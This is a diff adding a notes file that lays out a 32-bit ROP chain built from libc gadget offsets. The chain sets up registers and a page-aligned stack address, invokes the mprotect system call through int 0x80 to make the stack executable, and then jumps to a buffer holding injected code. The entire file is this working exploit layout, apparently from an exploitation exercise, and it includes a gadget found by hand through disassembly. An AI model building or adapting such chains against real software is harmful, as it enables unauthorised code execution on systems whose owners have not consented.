@@ -1,0 +1,58 @@
+All these are offsets (Add them to base address of libc)
+-------------------------------------------------------------
+
+0x0002f0ec : xor eax, eax ; ret
+0x00027662 : inc eax ; ret    ----------------------- 7 times
+
+0x0011be39 : mov edx, eax ; mov eax, edx ; ret
+0x0002f0ec : xor eax, eax ; ret
+
+0x001263b6 : dec eax ; ret
+
+0x00027b43 : and ax, 0x1000 ; movzx eax, ax ; ret
+
+0x0007eb60 : push eax ; pop esi ; pop edi ; pop ebp ; ret
+
+Dummy x 2 (Dummy = 0x11111111)
+
+0x0001b5b3 : mov ecx, esi ; add eax, 0x18c48300 ; pop ebx ; ret
+
+Dummy x 1
+
+0x0002f0ec : xor eax, eax ; ret
+
+0x001263b6 : dec eax ; ret
+
+0x00027b43 : and ax, 0x1000 ; movzx eax, ax ; ret
+
+0x001263b6 : dec eax ; ret
+
+0x0014878a : not eax ; add eax, 2 ; pop esi ; pop edi ; ret
+
+Dummy x 2
+
+0x001263b6 : dec eax ; ret
+
+0x001263b6 : dec eax ; ret
+
+0x0010f471 : push esp ; pop ebx ; pop esi ; ret
+
+Dummy x 1
+
+0x000ec152 : xchg ebx, edx ; ret
+
+0x0002daa0 : and eax, edx ; ret
+
+0x000ec152 : xchg ebx, edx ; ret
+
+0x001723dc : xchg eax, ebx ; ret
+
+0x0002f0ec : xor eax, eax ; ret
+
+0x0014323b : add al, 0x76 ; ret
+
+0x00027662 : inc eax ; ret    ----------------------- 7 times
+
+0x000ebe61 : int 0x80 ; pop ebp ; pop edi ; pop esi ; pop ebx ; ret (this gadget is not shown by ropgadget and had to be found by disassembly)
+ 
+<address of buffer>
